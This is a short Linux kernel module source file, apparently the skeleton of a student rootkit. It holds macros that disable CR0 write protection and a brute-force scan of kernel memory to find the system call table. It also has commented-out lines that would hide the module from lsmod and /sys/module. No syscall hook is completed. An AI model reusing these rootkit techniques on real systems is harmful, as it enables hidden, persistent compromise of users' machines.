#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/string.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng and Matthew");
MODULE_DESCRIPTION("Rootkit main entry"); 

/*
 * Disable write protection for hook system call table
 */
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
static unsigned long **hook_syscall_table(void);

// Real system call
asmlinkage long (*sys_open)(const char __user *, int, umode_t);
asmlinkage unsigned long **syscall_table;
 
static int lkm_init(void)
{
    //Hide this module from kernel modules(lsmod | grep [module]) 
    //list_del_init(&__this_module.list);

    //Hide this module from /sys/module
    //kobject_del(&THIS_MODULE->mkobj.kobj);
    printk("Hello world, module loaded\n");
    syscall_table = hook_syscall_table();
    if(!syscall_table){
        printk("Error for system call\n");
    } else {
        printk("Success for system call\n");
    }
    return 0;    
}

unsigned long ** hook_syscall_table(void)
{
  unsigned long **entry = (unsigned long **)PAGE_OFFSET;

  for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
    if (entry[__NR_close] == (unsigned long *)sys_close) {
        return entry;
      }
  }

  return NULL;
}
 
static void lkm_exit(void)
{
    printk("Hello world, module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);